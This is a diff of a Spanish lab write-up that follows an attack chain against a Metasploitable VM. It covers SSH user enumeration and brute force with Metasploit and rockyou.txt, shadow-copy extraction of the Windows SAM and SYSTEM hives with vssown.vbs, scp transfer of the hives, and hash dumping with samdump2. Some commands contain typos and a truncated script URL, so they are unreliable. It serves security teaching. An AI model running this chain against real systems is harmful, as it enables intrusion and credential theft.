@@ -2,7 +2,7 @@
 title: "Lab.02 - Kill Chains 1"
 date: 2026-06-09
 categories: [lab, setup]
-tags: [metasploitable, Virtualbox(VM), kali, kill_Chain]
+tags: [kill_Chain, SSH, VSS, metasploitable, kali]
 ---
 #KILL CHAIN 1: SSH Brute Force + Credential Dumping 
 
@@ -75,7 +75,7 @@ Resultado:
 ![5.1](/assets/5.1.png)
 
 
-###C:Escaneo de Vulnerabilidades (con Scripts): 
+##C:Escaneo de Vulnerabilidades (con Scripts): 
 Permite evaluar los servicios identificados en los puertos abiertos para detectar posibles vulnerabilidades conocidas. Para ello, se utilizan scripts de Nmap que realizan comprobaciones específicas sobre los servicios en ejecución, facilitando la identificación de fallos de seguridad que podrían ser aprovechados por un atacante.
 
         nmap --script vuln -p80,445 10.0.2.15
@@ -103,10 +103,9 @@ Permite analizar la ruta seguida por los paquetes hacia el host objetivo e ident
 Resultado:
 ![8.1](/assets/8.1.png)
 
-
 ## ETAPA 2: Enumeración de servicios
 
-###2.1.Escaneo de servicio SSH
+##2.1.Escaneo de servicio SSH
 Permite identificar si el servicio SSH se encuentra activo en el puerto correspondiente, así como obtener información sobre la versión del software en ejecución para evaluar posibles vulnerabilidades o configuraciones inseguras.
 
 Explicación:
@@ -118,7 +117,7 @@ Resultado:
 
 ## ETAPA 3:Acceso Inicial
 
-###3.1. Descarga de diccionarios
+##3.1. Descarga de diccionarios
 
 Diccionarios para el laboratorio:
 
@@ -149,8 +148,8 @@ Se garantiza que el password se encuentra en la lista de diccionarios.
 Usuario vagrant con **cat rockyou.txt | grep vagrant**
 ![10.2](/assets/10.2.png)
 
-###3.2. Enumeración de Usuarios con Metasploit
------
+##3.2. Enumeración de Usuarios con Metasploit
+
 Se crean 2 entornos de trabajo, la terminal superior será de Linux y la terminal inferior será para invocar a Metasploitable, ya que en esa región se podrán leer los comandos propios de Metasploitable.
 
 ![11.1](/assets/11.1.png)
@@ -163,8 +162,6 @@ Se inicia Metasploitable con "msfconsole -q". La carga se visualiza como "msf6>"
 
 Resultado:
 ![11.2](/assets/11.2.png)
-
------
 
 Ahora el Atacante (Kali) envía "scripts" paquetes SSH de autenticación con una lista de usuarios a la víctima = "target (Metasploitable)" y este lo recibe. La víctima responde con un mensaje que permite que el Atacante pueda identificar si el usuario que se ha intentado es válido o no.
 
@@ -183,10 +180,10 @@ Resultado
 Se configura el párametro RHOST y se le asigna el valor IP de la máquina target. Luego se configura el archivo donde van a estar los usuarios y el nombre del diccionario:
 
 Se ingresa: 
-     msf6 auxiliary(scanner/ssh/ssh_anumusers)>set RHOSTS 10.0.2.15
-     msf6 auxiliary(scanner/ssh/ssh_anumusers)>USER_FILE /home/user/Downloads/diccionarios/top-usernmaes-shortlist.txt
-     msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
-     msf6 auxiliary(scanner/ssh/ssh_anumusers)>run
+1.msf6 auxiliary(scanner/ssh/ssh_anumusers)>set RHOSTS 10.0.2.15
+2.msf6 auxiliary(scanner/ssh/ssh_anumusers)>USER_FILE /home/user/Downloads/diccionarios/top-usernmaes-shortlist.txt
+3.msf6 auxiliary(scanner/ssh/ssh_anumusers)>show options
+4. msf6 auxiliary(scanner/ssh/ssh_anumusers)>run
 
 Resultado
 ![11.4](/assets/11.4.png)
@@ -195,10 +192,8 @@ Ejecutamos con "run" para enviar los archivos.
 
 En el script de Metasploitable: se ha encontrado el potencial usuario 'vagrant', ahora se tiene que intentar conseguir el password adecuado para el usuario.
 
-
 ![11.5](/assets/11.5.png)
 
------
 ##3.3. Ataque de Fuerza Bruta en SSH
 
 Luego de haber encontrado un usuario válido, se utiliza un ataque de fuerza bruta obtener posibles contraseñas.
@@ -206,18 +201,18 @@ Luego de haber encontrado un usuario válido, se utiliza un ataque de fuerza bru
 Para ello se ingresa el script 'ssh_login' en Metasploitable para las autenticaciones sobre el usuario encontrado 'vagrant' con sus potenciales passwords que se encontrarán listados en el archivo ''.
 Recordar que tenemos que cambiar de módulo (modulo actual: ssh_enunusers) para realizar el 'login', con el comando 'use auxiliary/scanner/ssh/ssh_login'.
 
-     msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
-     msf6 auxiliary(scanner/ssh/ssh_login)>show options
-     msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
-     msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
-     msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
-     msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
-     msf6 auxiliary(scanner/ssh/ssh_login)>show options
-     msf6 auxiliary(scanner/ssh/ssh_login)>run
+1.msf6 auxiliary(scanner/ssh/ssh_anumusers)>use auxiliary/scanner/ssh/ssh_login
+2.msf6 auxiliary(scanner/ssh/ssh_login)>show options
+3.msf6 auxiliary(scanner/ssh/ssh_login)>set RHOSTS 10.0.2.15
+4.msf6 auxiliary(scanner/ssh/ssh_login)>set USERNAME vagrant
+5.msf6 auxiliary(scanner/ssh/ssh_login)>set PASS_FILE /home/user/Downloads/diccionarios/rockyou.txt 
+6.msf6 auxiliary(scanner/ssh/ssh_login)>set VERBOSE true
+7.msf6 auxiliary(scanner/ssh/ssh_login)>show options
+8.msf6 auxiliary(scanner/ssh/ssh_login)>run
 
 Se realiza el cambio de ruta y a través de 'show options' se observan las configuraciones principales como: 
-- SET RHOSTS IP de la víctima: 10.0.2.15', 
-- El username 'vagrant'
+- SET RHOSTS IP de la víctima: *10.0.2.15* 
+- El username *vagrant*
 - PASS_FILE: la ruta del archivo con las direcciones
 
 Resultado:
@@ -226,19 +221,17 @@ Resultado:
 
 Se ejecuta y empieza a  realizar la búsqueda del USERNAME 'vagrant':
 ![12.3](/assets/12.3.png)
--------------------
-----------------
 
 ##ETAPA 4: Explotación y Acceso
 
-###4.1. CONEXIÓN SSH 
+##4.1. CONEXIÓN SSH 
 Ya obtenido el usuario y contraseña de la víctima (USERNAME: vagrant, CONTRASEÑA: vagrant), se procede a realizar la conexión SSH con la IP '10.0.2.15'. Sin embargo, para un mejor entorno de ejecución se ingresa al modo/terminal 'bash' de Metasploitable:
 
 ![13.1](/assets/13.1.png)
 
 ##ETAPA 5: Extracción de Archivos SAM y SYSTEM 
 
-###5.1. Comprobación de los Privilegios
+##5.1. Comprobación de los Privilegios
 
 Desde el lado del adversario (Metasploitable) es necesario comprobar los privilegios que se tienen a través, del comando: 'whoami /priv'.
 
@@ -256,9 +249,7 @@ Resultado:
 ###5.2. Localiza el Script vssown.vbs
 Antes de continuar, se debe comprobar que el script vssown.vbs se encuentre disponible en el sistema comprometido. Este script se utiliza para crear una copia de sombra (Volume Shadow Copy), lo que permite acceder a archivos protegidos por el sistema.
 
-En caso de que el archivo no esté disponible, puede descargarse previamente desde Kali Linux a través de su repositorio oficial:
-
-   https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs
+En caso de que el archivo no esté disponible, puede descargarse previamente desde Kali Linux a través de su repositorio oficial: https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vb
 
 Luego en la terminal de Kali ingresar el comando siguiente e ingresar la contraseña: 'vagrant', para copiar un archivo del computador local hacia el objetivo remoto: 
 
@@ -278,7 +269,6 @@ Se realiza la conexión vía ssh a 'ssh vagrant@10.0.2.15', se ingresa la contra
 
 ![14.3](/assets/14.3.png)
 
-
 Una vez transferido, ingresar a la ruta del archivo y listar el archivo vssown.vbs para verificar que se encuentra en esta carpeta:
 
 ssh vagrant@10.0.2.15 
@@ -290,7 +280,6 @@ ls -lh C:\\Users\\vagrant\\Downloads\\vssown.vbs
 
 Resultado:
 ![14.4](/assets/14.4.png)
-
 
 ##5.3. ¿Qué podemos hacer con el vssown.vbs?
 Para listar los comandos que el archivo vssown.vbs permite ejecutar, solo debemos ejecutar 'cscript vssown.vbs' en la máquina víctima (Metasploitable). Asimismo, los comandos que vamos a usar son:
@@ -333,13 +322,13 @@ Se listan los volúmenes de shadows (vss) existentes:
 
 El script vssown.vbs generará una salida con la ubicación de la copia de sombra. De la imagen anterior se obtiene la ruta, esta será la ubicación donde podremos acceder a los archivos SAM y SYSTEM sin restricciones. En el comando anterior, la ruta es:
 
-     \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
+ \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1 
 
 ##5.5. Copia los Archivos SAM y SYSTEM
 
 Ahora que tenemos la ruta de la copia del volumen shadow (vss), entrar en la terminal de Kali, para ello se debe de ingresar al ssh:
 
-  Líneas de comando:
+Líneas de comando:
 
   ssh vagrant@10.0.2.15 
         -sh-4.3$ cmd   #ingresar al terminal de Windows 
@@ -360,7 +349,6 @@ Resultado:
 ![14.8](/assets/14.8.png)
 Salimos del modo cmd con 'exit'
 
-
 ## ETAPA 6: Transferir los Archivos SAM y SYSTEM al atacante
 
 Previamente identificar la ruta real usando **scp** o descarga los archivos SAM y SYSTEM desde la máquina víctima a tu máquina atacante para realizar el análisis de los hashes de contraseñas. Para ello ingresar a la terminal de Kali, a la carpeta de descargas, con: 
@@ -368,7 +356,7 @@ Previamente identificar la ruta real usando **scp** o descarga los archivos SAM 
 1. scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SAM .
 2. scp vagrant@10.0.2.15:/cygdrive/c/Windows/Temp/SYSTEM .
 
-                 password: vagrant
+password: vagrant
 
 Resultado:
 ![14.9](/assets/14.9.png)
@@ -378,8 +366,8 @@ Resultado:
 ** samdump2: Asimismo, permite extraer los hashes de las contraseñas almacenadas en Windows utilizando los archivos SYSTEM y SAM. El archivo SYSTEM contiene la información necesaria para descifrar los datos protegidos del archivo SAM (Security Account Manager), donde se almacenan los hashes de las cuentas de usuario.
 
 En Kali:
-             samdump2 SYSTEM SAM > hashes.txt
-             samdump2 SYSTEM SAM 
+1. samdump2 SYSTEM SAM > hashes.txt
+2. samdump2 SYSTEM SAM 
 
 NOTA: Para funcionar, samdump2 requiere dos archivos específicos del registro de Windows: el hive SYSTEM y el hive SAM. El archivo SYSTEM contiene la clave necesaria para descifrar la información almacenada en el archivo SAM (Security Account Manager), que es donde residen los hashes de las contraseñas de los usuarios.
 
@@ -387,7 +375,6 @@ Al ejecutar el comando samdump2 SYSTEM SAM > hashes.txt, la herramienta procesa 
 
 Resultado:
 ![15.1](/assets/15.1.png)
-
 
 
 ##Reinicio de resultados de John the Ripper
